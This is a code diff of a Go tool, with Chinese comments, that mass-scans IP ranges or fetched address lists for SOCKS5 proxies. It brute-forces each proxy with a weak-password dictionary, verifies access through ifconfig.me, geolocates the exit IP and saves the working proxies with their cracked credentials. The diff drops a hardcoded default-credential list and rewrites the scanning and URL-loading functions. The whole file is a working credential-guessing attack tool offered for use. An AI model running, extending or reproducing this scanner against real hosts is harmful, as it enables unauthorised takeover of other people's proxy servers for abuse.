@@ -3,7 +3,6 @@ package main
 import (
 	"bufio"
 	"context"
-	"crypto/tls"
 	"encoding/json"
 	"flag"
 	"fmt"
@@ -11,7 +10,6 @@ import (
 	"log"
 	"net"
 	"net/http"
-	"net/url"
 	"os"
 	"os/signal"
 	"sort"
@@ -22,38 +20,24 @@ import (
 	"syscall"
 	"time"
 
-	"github.com/cheggaaa/pb/v3"
 	"golang.org/x/net/proxy"
 	"golang.org/x/time/rate"
+
+	"github.com/cheggaaa/pb/v3"
 )
 
-// ==================== 配置与常量 ====================
+// ==================== 配置 ====================
 var (
-	weakPasswords = [][2]string{
-		{"123456", "123456"}, {"password", "password"}, {"admin", "admin"},
-		{"admin", "123456"}, {"root", "root"}, {"root", "123456"},
-		{"123456789", "123456789"}, {"qwerty", "qwerty"}, {"12345", "12345"},
-		{"12345678", "12345678"}, {"111111", "111111"}, {"user", "user"},
-		{"user", "password"}, {"123", "123"}, {"proxy", "proxy"}, {"socks5", "socks5"},
-		{"1234567", "1234567"}, {"iloveyou", "iloveyou"}, {"123123", "123123"},
-		{"000000", "000000"}, {"welcome", "welcome"}, {"secret", "secret"},
-		{"dragon", "dragon"}, {"monkey", "monkey"}, {"football", "football"},
-		{"letmein", "letmein"}, {"sunshine", "sunshine"}, {"baseball", "baseball"},
-		{"princess", "princess"}, {"admin123", "admin123"}, {"superman", "superman"},
-		{"guest", "guest"}, {"", "123456"}, {"admin", ""}, {"", "admin"},
-		{"test", "test"}, {"demo", "demo"},
-	}
+	protocols = []string{"socks5"}
+
+	weakPasswordsSlice [][2]string
 
 	countryCache      sync.Map
-	validCount  int64
-	seenProxies sync.Map
-
-	detailFile *os.File
-	validFile  *os.File
-	logFile    *os.File
-
-	countryCacheFile = "country_cache.json"
-	limiter          = rate.NewLimiter(rate.Every(time.Second/100), 100)
+	seenProxies       sync.Map
+	validCount        int64
+	detailFile, validFile, logFile *os.File
+	countryCacheFile  = "country_cache.json"
+	limiter           = rate.NewLimiter(rate.Every(time.Second/100), 100)
 
 	detailMu sync.Mutex
 	validMu  sync.Mutex
@@ -71,7 +55,7 @@ type Result struct {
 	IsWeak   bool
 }
 
-// ==================== 任务结构 ====================
+// ==================== 扫描任务 ====================
 type scanTask struct {
 	IP   string
 	Port int
@@ -118,7 +102,7 @@ func main() {
 		finalTimeout = promptDuration("超时时间（如 5s，默认: 5s）: ", defaultTimeout)
 	}
 
-	weakPasswords = loadWeakPasswords("weak_passwords.txt")
+	weakPasswordsSlice = loadWeakPasswords("weak_passwords.txt")
 
 	detailFile, err = os.OpenFile("result_detail.txt", os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
 	if err != nil {
@@ -144,64 +128,19 @@ func main() {
 		cancel()
 	}()
 
+	// 进度条
 	bar := pb.New(0)
 	bar.SetWriter(io.MultiWriter(os.Stdout, logFile))
 	bar.Set("prefix", "Scanning ")
 	bar.Start()
 
+	// 生成任务
 	go func() {
 		defer close(taskChan)
 		if finalURL != "" {
-			ips, portsFromURL, err := fetchAddrsFromURLStream(finalURL, finalTimeout)
-			if err != nil {
-				log.Printf("URL 加载失败 → 进入交互输入: %v", err)
-				if finalIPRange == "" {
-					finalIPRange = promptIPRange(defaultStart, defaultEnd)
-				}
-				if finalPortInput == "" {
-					finalPortInput = prompt("端口（默认: "+defaultPort+"): ", defaultPort)
-				}
-				ports, _ := parsePorts(finalPortInput)
-				ipChan, _ := ipGenerator(finalIPRange)
-				for ip := range ipChan {
-					for _, p := range ports {
-						select {
-						case taskChan <- scanTask{IP: ip, Port: p}:
-						case <-ctx.Done():
-							return
-						}
-					}
-				}
-				return
-			}
-			if len(ips) > 0 && len(portsFromURL) == 0 {
-				if finalPortInput == "" {
-					finalPortInput = prompt("URL 未包含端口，请输入端口（默认: "+defaultPort+"): ", defaultPort)
-				}
-				ports, _ := parsePorts(finalPortInput)
-				for _, ip := range ips {
-					for _, p := range ports {
-						select {
-						case taskChan <- scanTask{IP: ip, Port: p}:
-						case <-ctx.Done():
-							return
-						}
-					}
-				}
-			} else {
-				for _, ip := range ips {
-					for _, p := range portsFromURL {
-						select {
-						case taskChan <- scanTask{IP: ip, Port: p}:
-						case <-ctx.Done():
-							return
-						}
-					}
-				}
-			}
+			streamAddrsFromURL(ctx, finalURL, finalPortInput, taskChan)
 			return
 		}
-
 		if finalIPRange == "" {
 			finalIPRange = promptIPRange(defaultStart, defaultEnd)
 		}
@@ -221,13 +160,12 @@ func main() {
 		}
 	}()
 
+	// 扫描协程
 	var wg sync.WaitGroup
 	sem := make(chan struct{}, finalThreads)
 	totalScanned := int64(0)
 
 	for task := range taskChan {
-		current := atomic.AddInt64(&totalScanned, 1)
-		_ = current
 		wg.Add(1)
 		sem <- struct{}{}
 		go func(t scanTask) {
@@ -246,6 +184,8 @@ func main() {
 					writeResult(result)
 				}
 			}
+			atomic.AddInt64(&totalScanned, 1)
+			bar.SetTotal(int(totalScanned + int64(len(taskChan))))
 			bar.Increment()
 		}(task)
 	}
@@ -255,26 +195,28 @@ func main() {
 	log.Printf("[+] 已保存 %d 个代理 → proxy_valid.txt", atomic.LoadInt64(&validCount))
 }
 
-// ==================== URL 流式加载 ====================
-func fetchAddrsFromURLStream(u string, timeout time.Duration) ([]string, []int, error) {
-	log.Printf("[*] 正在从 URL 加载代理列表: %s", u)
-	client := &http.Client{
-		Timeout:       timeout,
-		CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse },
-	}
+// ==================== 流式 URL 加载 ====================
+func streamAddrsFromURL(ctx context.Context, u, portInput string, taskChan chan<- scanTask) {
+	log.Printf("[*] 正在从 URL 流式加载代理: %s", u)
+	client := &http.Client{Timeout: 15 * time.Second}
 	resp, err := client.Get(u)
 	if err != nil {
-		return nil, nil, err
+		log.Printf("[!] URL 获取失败: %v", err)
+		return
 	}
 	defer resp.Body.Close()
 	if resp.StatusCode != http.StatusOK {
-		return nil, nil, fmt.Errorf("status %d", resp.StatusCode)
+		log.Printf("[!] URL 返回状态: %d", resp.StatusCode)
+		return
 	}
-
+	ports, _ := parsePorts(portInput)
 	scanner := bufio.NewScanner(resp.Body)
-	var ips []string
-	portSet := make(map[int]bool)
 	for scanner.Scan() {
+		select {
+		case <-ctx.Done():
+			return
+		default:
+		}
 		line := strings.TrimSpace(scanner.Text())
 		if line == "" || !strings.Contains(line, ":") {
 			continue
@@ -282,28 +224,111 @@ func fetchAddrsFromURLStream(u string, timeout time.Duration) ([]string, []int, 
 		parts := strings.SplitN(line, ":", 2)
 		ipStr := strings.TrimSpace(parts[0])
 		portStr := strings.TrimSpace(parts[1])
+		if net.ParseIP(ipStr) == nil {
+			continue
+		}
 		port, err := strconv.Atoi(portStr)
 		if err != nil || port <= 0 || port > 65535 {
 			continue
 		}
-		if net.ParseIP(ipStr) == nil {
-			continue
+		for _, p := range ports {
+			select {
+			case taskChan <- scanTask{IP: ipStr, Port: p}:
+			case <-ctx.Done():
+				return
+			}
 		}
-		ips = append(ips, ipStr)
-		portSet[port] = true
 	}
+}
 
-	var ports []int
-	for p := range portSet {
-		ports = append(ports, p)
+// ==================== 扫描代理 ====================
+func scanProxy(ctx context.Context, ip string, port int, timeout time.Duration) Result {
+	result := Result{IP: ip, Port: port}
+	if ctx.Err() != nil {
+		return result
 	}
-	sort.Ints(ports)
+	for _, pair := range weakPasswordsSlice {
+		if ctx.Err() != nil {
+			return result
+		}
+		auth := &proxy.Auth{User: pair[0], Password: pair[1]}
+		ok, lat, exportIP := testSocks5(ctx, ip, port, auth, timeout)
+		if ok {
+			result.Scheme = "socks5"
+			result.Latency = lat
+			result.ExportIP = exportIP
+			result.Country = getCountry(exportIP)
+			result.Auth = fmt.Sprintf("%s:%s", pair[0], pair[1])
+			result.IsWeak = true
+			return result
+		}
+	}
+	return result
+}
 
-	if err := scanner.Err(); err != nil {
-		return nil, nil, err
+// ==================== SOCKS5 测试 ====================
+func testSocks5(ctx context.Context, ip string, port int, auth *proxy.Auth, timeout time.Duration) (bool, int, string) {
+	if err := limiter.Wait(ctx); err != nil {
+		return false, 0, ""
 	}
-	log.Printf("[*] URL 加载完成: %d 个 IP, %d 个端口", len(ips), len(ports))
-	return ips, ports, nil
+	start := time.Now()
+	addr := fmt.Sprintf("%s:%d", ip, port)
+	dialer, err := proxy.SOCKS5("tcp", addr, auth, proxy.Direct)
+	if err != nil {
+		return false, 0, ""
+	}
+	conn, err := dialer.Dial("tcp", "ifconfig.me:80")
+	if err != nil {
+		return false, 0, ""
+	}
+	defer conn.Close()
+	conn.SetDeadline(time.Now().Add(timeout))
+	_, _ = fmt.Fprintf(conn, "GET /ip HTTP/1.1\r\nHost: ifconfig.me\r\nConnection: close\r\n\r\n")
+	buf := make([]byte, 1024)
+	n, _ := conn.Read(buf)
+	exportIP := strings.TrimSpace(string(buf[:n]))
+	if exportIP == "" {
+		return false, 0, ""
+	}
+	return true, int(time.Since(start).Milliseconds()), exportIP
+}
+
+// ==================== 国家信息查询 ====================
+func getCountry(ip string) string {
+	if v, ok := countryCache.Load(ip); ok {
+		return v.(string)
+	}
+	country := queryCountry(ip)
+	countryCache.Store(ip, country)
+	return country
+}
+
+func queryCountry(ip string) string {
+	client := &http.Client{Timeout: 5 * time.Second}
+	resp, err := client.Get("http://ip-api.com/json/" + ip + "?fields=countryCode")
+	if err != nil {
+		return "XX"
+	}
+	defer resp.Body.Close()
+	var data struct {
+		Country string `json:"countryCode"`
+	}
+	_ = json.NewDecoder(resp.Body).Decode(&data)
+	if data.Country == "" {
+		data.Country = "XX"
+	}
+	return data.Country
+}
+
+// ==================== 写入结果 ====================
+func writeResult(r Result) {
+	detailMu.Lock()
+	fmt.Fprintf(detailFile, "%s:%d %s %s %dms %s\n", r.IP, r.Port, r.Scheme, r.Auth, r.Latency, r.Country)
+	detailMu.Unlock()
+
+	validMu.Lock()
+	fmt.Fprintf(validFile, "%s:%d\n", r.IP, r.Port)
+	validMu.Unlock()
 }
 
 // ==================== 交互输入 ====================
@@ -340,7 +365,7 @@ func promptIPRange(start, end string) string {
 	return s + "-" + e
 }
 
-// ==================== IP 生成器 ====================
+// ==================== IP/端口解析 ====================
 func ipGenerator(r string) (<-chan string, error) {
 	if strings.Contains(r, "/") {
 		return cidrGenerator(r)
@@ -371,7 +396,6 @@ func rangeDashGenerator(r string) (<-chan string, error) {
 	if start == nil || end == nil {
 		return nil, fmt.Errorf("invalid IPv4 address")
 	}
-
 	ch := make(chan string)
 	go func() {
 		defer close(ch)
@@ -395,11 +419,6 @@ func incIP(ip net.IP) {
 	}
 }
 func compareIP(a, b net.IP) int {
-	a = a.To4()
-	b = b.To4()
-	if a == nil || b == nil {
-		return strings.Compare(a.String(), b.String())
-	}
 	for i := 0; i < 4; i++ {
 		if a[i] < b[i] {
 			return -1
@@ -409,8 +428,6 @@ func compareIP(a, b net.IP) int {
 	}
 	return 0
 }
-
-// ==================== 端口解析 ====================
 func parsePorts(input string) ([]int, error) {
 	var ports []int
 	input = strings.ReplaceAll(input, ",", " ")
@@ -445,12 +462,12 @@ func parsePorts(input string) ([]int, error) {
 	return ports, nil
 }
 
-// ==================== 加载弱密码 ====================
+// ==================== 弱密码加载 ====================
 func loadWeakPasswords(file string) [][2]string {
 	data, err := os.ReadFile(file)
 	if err != nil {
 		log.Printf("Warning: failed to load weak passwords file: %v", err)
-		return weakPasswords
+		return [][2]string{{"guest", "guest"}, {"admin", "admin"}}
 	}
 	var list [][2]string
 	for _, line := range strings.Split(string(data), "\n") {
@@ -466,107 +483,10 @@ func loadWeakPasswords(file string) [][2]string {
 	if len(list) > 0 {
 		return list
 	}
-	return weakPasswords
+	return [][2]string{{"guest", "guest"}, {"admin", "admin"}}
 }
 
-// ==================== 扫描代理（只保留带认证 SOCKS5） ====================
-func scanProxy(ctx context.Context, ip string, port int, timeout time.Duration) Result {
-	result := Result{IP: ip, Port: port}
-
-	for _, pair := range weakPasswords {
-		if ctx.Err() != nil {
-			return result
-		}
-		auth := &proxy.Auth{User: pair[0], Password: pair[1]}
-		ok, lat, exportIP := testProxy(ctx, "socks5", ip, port, auth, timeout)
-		if ok && isPublicIP(exportIP) && testInternetAccess("socks5", ip, port, auth, timeout) {
-			result.Scheme = "socks5"
-			result.Latency = lat
-			result.ExportIP = exportIP
-			result.Country = getCountry(exportIP)
-			if result.Country == "XX" {
-				result.Country = getCountry(ip)
-			}
-			result.Auth = fmt.Sprintf("%s:%s", pair[0], pair[1])
-			result.IsWeak = true
-			return result
-		}
-	}
-	return result
-}
-
-// ==================== SOCKS5 测试 ====================
-func testProxy(ctx context.Context, scheme, ip string, port int, auth *proxy.Auth, timeout time.Duration) (bool, int, string) {
-	if scheme != "socks5" || auth == nil {
-		return false, 0, ""
-	}
-	if err := limiter.Wait(ctx); err != nil {
-		return false, 0, ""
-	}
-	start := time.Now()
-	addr := fmt.Sprintf("%s:%d", ip, port)
-	dialer, err := proxy.SOCKS5("tcp", addr, auth, proxy.Direct)
-	if err != nil {
-		return false, 0, ""
-	}
-	conn, err := dialer.Dial("tcp", "ifconfig.me:80")
-	if err != nil {
-		return false, 0, ""
-	}
-	defer conn.Close()
-	conn.SetDeadline(time.Now().Add(timeout))
-	_, _ = fmt.Fprintf(conn, "GET /ip HTTP/1.1\r\nHost: ifconfig.me\r\nConnection: close\r\n\r\n")
-	buf := make([]byte, 1024)
-	n, _ := conn.Read(buf)
-	exportIP := strings.TrimSpace(string(buf[:n]))
-	return exportIP != "", int(time.Since(start).Milliseconds()), exportIP
-}
-
-// ==================== 外网访问检测 ====================
-func testInternetAccess(scheme, ip string, port int, auth *proxy.Auth, timeout time.Duration) bool {
-	if scheme != "socks5" || auth == nil {
-		return false
-	}
-	client := &http.Client{
-		Timeout: timeout,
-		Transport: &http.Transport{
-			Proxy: func(_ *http.Request) (*url.URL, error) {
-				return url.Parse(fmt.Sprintf("socks5://%s:%s@%s:%d", auth.User, auth.Password, ip, port))
-			},
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		},
-	}
-	resp, err := client.Get("https://www.google.com/generate_204")
-	if err != nil {
-		return false
-	}
-	resp.Body.Close()
-	return resp.StatusCode == 204
-}
-
-// ==================== 国家信息 ====================
-func getCountry(ip string) string {
-	if val, ok := countryCache.Load(ip); ok {
-		return val.(string)
-	}
-	country := queryCountry(ip)
-	countryCache.Store(ip, country)
-	return country
-}
-func queryCountry(ip string) string {
-	// 简化，实际可使用 geoip 库
-	return "XX"
-}
-func isPublicIP(ipStr string) bool {
-	ip := net.ParseIP(ipStr)
-	if ip == nil {
-		return false
-	}
-	if ip.IsLoopback() || ip.IsPrivate() {
-		return false
-	}
-	return true
-}
+// ==================== 国家缓存 ====================
 func loadCountryCache() {
 	data, err := os.ReadFile(countryCacheFile)
 	if err != nil {
@@ -582,22 +502,14 @@ func loadCountryCache() {
 }
 func saveCountryCache() {
 	m := make(map[string]string)
-	countryCache.Range(func(k, v interface{}) bool {
-		m[k.(string)] = v.(string)
+	countryCache.Range(func(key, value any) bool {
+		k, ok1 := key.(string)
+		v, ok2 := value.(string)
+		if ok1 && ok2 {
+			m[k] = v
+		}
 		return true
 	})
 	data, _ := json.MarshalIndent(m, "", "  ")
 	_ = os.WriteFile(countryCacheFile, data, 0644)
-}
-
-// ==================== 写入结果 ====================
-func writeResult(r Result) {
-	detailMu.Lock()
-	defer detailMu.Unlock()
-	line := fmt.Sprintf("%s:%d [%s] %s %dms %s\n", r.IP, r.Port, r.Scheme, r.Auth, r.Latency, r.Country)
-	detailFile.WriteString(line)
-
-	validMu.Lock()
-	defer validMu.Unlock()
-	validFile.WriteString(fmt.Sprintf("%s:%d\n", r.IP, r.Port))
 }
